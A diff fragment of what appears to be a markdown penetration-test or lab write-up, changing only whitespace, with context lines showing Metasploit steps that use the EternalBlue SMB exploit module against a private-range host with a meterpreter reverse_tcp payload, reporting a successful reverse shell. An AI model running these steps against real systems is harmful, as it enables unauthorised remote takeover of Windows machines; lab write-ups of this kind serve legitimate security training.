@@ -101,7 +101,7 @@ use exploit/windows/smb/ms17_010_eternalblue
 1. set RHOST 192.168.20.130
 2. set PAYLOAD windows/x64/meterpreter/reverse_tcp
 3. exploit
-
+   
 **Result:**
 
 - Successful **reverse shell**
